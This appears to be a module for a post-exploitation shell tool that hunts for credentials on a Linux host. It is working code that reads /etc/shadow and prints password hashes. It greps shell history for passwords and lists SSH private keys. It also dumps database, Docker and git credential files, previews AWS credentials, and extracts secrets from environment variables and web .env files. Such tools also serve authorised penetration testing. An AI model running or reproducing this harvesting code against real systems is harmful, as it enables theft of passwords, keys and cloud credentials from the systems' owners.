// @name: credential_hunt
// @description: Hunt for credentials, keys, tokens, and secrets
// @category: enumerate
// @target_os: linux
// @author: clawsh
// @version: 2.0

let output = "=== Credential & Secret Hunt ===\n";
let findings = 0;

// --- Shadow file ---
let shadow = exec_cmd("cat /etc/shadow 2>/dev/null | head -30");
if shadow.len() > 0 && !shadow.contains("Permission denied") {
    output += "\n\x1b[1;31m[!] /etc/shadow is READABLE!\x1b[0m\n";
    for line in shadow.split("\n") {
        if line.len() > 0 && !line.contains("*") && !line.contains("!") {
            let parts = line.split(":");
            if parts.len() > 1 {
                let user = parts[0];
                let hash = parts[1];
                if hash.len() > 3 {
                    output += "  \x1b[33m" + user + "\x1b[0m: " + hash + "\n";
                    findings += 1;
                }
            }
        }
    }
}

// --- History files (single combined command) ---
output += "\n\x1b[1;4mHistory files (password/secret patterns):\x1b[0m\n";
let history = exec_cmd("cat ~/.bash_history ~/.zsh_history 2>/dev/null | grep -iE 'pass(word)?|secret|token|mysql.*-p|ssh.*-i|curl.*-u|wget.*--password' | sort -u | tail -20");
if history.len() > 0 {
    for line in history.split("\n") {
        if line.len() > 0 {
            output += "  \x1b[33m" + line + "\x1b[0m\n";
            findings += 1;
        }
    }
} else {
    output += "  (no interesting patterns found)\n";
}

// --- SSH private keys (specific dirs only, no find /) ---
output += "\n\x1b[1;4mSSH private keys:\x1b[0m\n";
let ssh_keys = exec_cmd("ls -la ~/.ssh/id_* /root/.ssh/id_* /home/*/.ssh/id_* /etc/ssh/*key 2>/dev/null | head -20");
if ssh_keys.len() > 0 {
    for line in ssh_keys.split("\n") {
        if line.len() > 0 {
            output += "  \x1b[1;33m" + line + "\x1b[0m\n";
            findings += 1;
        }
    }
} else {
    output += "  (none found)\n";
}

// --- Application config files (single combined command) ---
output += "\n\x1b[1;4mApplication credentials:\x1b[0m\n";
let app_creds = exec_cmd("for f in ~/.netrc ~/.pgpass ~/.my.cnf ~/.docker/config.json /etc/mysql/debian.cnf ~/.git-credentials; do test -f \"$f\" && echo \"FOUND:$f\" && head -5 \"$f\" && echo '---'; done 2>/dev/null");
if app_creds.len() > 0 {
    for line in app_creds.split("\n") {
        if line.len() > 0 {
            if line.starts_with("FOUND:") {
                output += "  \x1b[33m" + line.sub_string(6) + ":\x1b[0m\n";
                findings += 1;
            } else if line != "---" {
                output += "    " + line + "\n";
            }
        }
    }
} else {
    output += "  (none found)\n";
}

// --- Git repos with credentials (specific dirs) ---
output += "\n\x1b[1;4mGit config with auth:\x1b[0m\n";
let git_auth = exec_cmd("grep -rsl 'url.*@\\|token\\|password' /home/*/.git*/config /root/.git*/config /opt/*/.git/config /var/www/*/.git/config /srv/*/.git/config 2>/dev/null | head -10");
if git_auth.len() > 0 {
    for line in git_auth.split("\n") {
        if line.len() > 0 {
            output += "  \x1b[33m" + line + "\x1b[0m\n";
            let detail = exec_cmd("grep -iE 'url.*@|token|password' " + line + " 2>/dev/null | head -3");
            if detail.len() > 0 {
                for d in detail.split("\n") {
                    if d.len() > 0 {
                        output += "    " + d.trim() + "\n";
                    }
                }
            }
            findings += 1;
        }
    }
} else {
    output += "  (none found)\n";
}

// --- Cloud credentials (single combined command) ---
output += "\n\x1b[1;4mCloud credentials:\x1b[0m\n";
let cloud = exec_cmd("ls ~/.aws/credentials ~/.config/gcloud/application_default_credentials.json ~/.azure/accessTokens.json 2>/dev/null");
if cloud.len() > 0 {
    for line in cloud.split("\n") {
        if line.len() > 0 {
            output += "  \x1b[1;31m" + line + "\x1b[0m\n";
            findings += 1;
        }
    }
    let aws_preview = exec_cmd("cat ~/.aws/credentials 2>/dev/null | head -10");
    if aws_preview.len() > 0 {
        output += "  AWS credentials preview:\n";
        for line in aws_preview.split("\n") {
            if line.len() > 0 {
                output += "    " + line + "\n";
            }
        }
    }
} else {
    output += "  (none found)\n";
}

// --- Environment secrets ---
output += "\n\x1b[1;4mEnvironment secrets:\x1b[0m\n";
let env_secrets = exec_cmd("env 2>/dev/null | grep -iE '^[^=]*(KEY|SECRET|TOKEN|PASS|AUTH|CRED|API)' | head -20");
if env_secrets.len() > 0 {
    for line in env_secrets.split("\n") {
        if line.len() > 0 {
            output += "  \x1b[33m" + line + "\x1b[0m\n";
            findings += 1;
        }
    }
} else {
    output += "  (none found)\n";
}

// --- Web app .env files (specific dirs, no find /) ---
output += "\n\x1b[1;4mWeb application .env files:\x1b[0m\n";
let env_files = exec_cmd("ls /var/www/*/.env /var/www/*/*/.env /opt/*/.env /opt/*/*/.env /srv/*/.env /home/*/.env /home/*/*/.env 2>/dev/null | head -10");
if env_files.len() > 0 {
    for line in env_files.split("\n") {
        if line.len() > 0 {
            output += "  \x1b[33m" + line + "\x1b[0m\n";
            let snippet = exec_cmd("grep -iE 'PASS|SECRET|KEY|TOKEN|DB_' " + line + " 2>/dev/null | head -5");
            if snippet.len() > 0 {
                for s in snippet.split("\n") {
                    if s.len() > 0 {
                        output += "    " + s + "\n";
                    }
                }
            }
            findings += 1;
        }
    }
} else {
    output += "  (none found)\n";
}

// --- Summary ---
if findings > 0 {
    output += "\n\x1b[1;33m" + findings.to_string() + " credential finding(s) total\x1b[0m\n";
} else {
    output += "\n(no credentials found)\n";
}

print_output(output);

let RESULT = findings.to_string() + " credential finding(s)";

let DATA = #{
    findings: findings,
    shadow_readable: shadow.len() > 0 && !shadow.contains("Permission denied"),
    has_ssh_keys: ssh_keys.len() > 0,
    has_cloud_creds: cloud.len() > 0,
};
